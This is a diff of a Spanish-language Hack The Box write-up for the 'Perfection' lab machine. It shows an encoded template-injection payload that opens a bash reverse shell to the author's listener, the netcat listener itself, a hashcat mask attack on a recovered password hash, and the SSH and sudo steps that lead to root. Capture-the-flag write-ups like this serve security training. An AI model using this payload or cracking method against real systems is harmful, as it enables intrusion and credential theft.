@@ -35,7 +35,6 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 ---
-
 ## Web Analysis & Vulnerability Exploitation
 
 ![](/assets/img/htb-writeup-perfection/perfection1.png)
@@ -61,12 +60,15 @@ YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42NS80NDQ0IDA+JjEiCg==
 ```
 El payload quedaria de la siguiente manera:
 
-* '%0A<%25%3d+system("echo+'YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42NS80NDQ0IDA+JjEiCg=='+|base64+-d+|bash")+%25>'.
+```
+%0A<%25%3d+system("echo+'YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi42NS80NDQ0IDA+JjEiCg=='+|base64+-d+|bash")+%25>
+```
 
 ```terminal
 -$ nc -nlvp 4444
 	lisening on [any] 4444 ...
 ```
+
 Luego de ponerme en escucha con Netcat, envio la peticion 'POST'.
 
 ![](/assets/img/htb-writeup-perfection/perfection8.png)
@@ -74,25 +76,26 @@ Luego de ponerme en escucha con Netcat, envio la peticion 'POST'.
 ```terminal
 	...connect to [10.10.16.65] from (UNKNOWN) [10.10.11.253] 35964
 
-python3 -c "import pty;pty.spawn('/bin/bash')"
+$ python3 -c "import pty;pty.spawn('/bin/bash')"
 
 susan@perfection:~$ cat user.txt
 ```
 
 ---
-
 ## Privilege Escalation
+
+Enumerando el sistema, encuentro dos archivos importantes: 'pupilpath_credentials.db', que contiene un hash que parece corresponder a una contraseña, y un correo con instrucciones para establecer el formato de una nueva contraseña.
 
 ![](/assets/img/htb-writeup-perfection/perfection10.png)
 ![](/assets/img/htb-writeup-perfection/perfection11.png)
 
-Enumerando el sistema, encuentro dos archivos importantes: 'pupilpath_credentials.db', que contiene un hash que parece corresponder a una contraseña, y un correo con instrucciones para establecer el formato de una nueva contraseña.
-
 Con esta información, puedo reconstruir gran parte de la contraseña:
+
 ```text
 {firstname}_{firstname backwards}_{randomly generated integer between 1 and 1.000.000.000}
    susan   _       nasus         _                    ?????????
 ```
+
 Solo me restaría encontrar el número entre 1 y 1.000.000.000, lo cual es fácilmente descifrable conociendo el hash.
 
 ```terminal
@@ -100,7 +103,8 @@ Solo me restaría encontrar el número entre 1 y 1.000.000.000, lo cual es fáci
 
 /home/kali/Documents/htb/machines/perfection:-$ hashcat -m 1400 -a hash.txt susan_nasus_?d?d?d?d?d?d?d?d?d > password
 abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
-
+```
+```terminal
 /home/kali/Documents/htb/machines/perfection:-$ ssh susan@10.10.11.253
 susan@10.10.11.253's password: susan_nasus_413759210 
 
@@ -109,3 +113,6 @@ sudo password for susan: susan_nasus_413759210
 
 root@perfection:/home/susan## cat /root/root.txt
 ```
+
+> <https://www.hackthebox.com/achievement/machine/1521382/590>
+{: .prompt-tip }
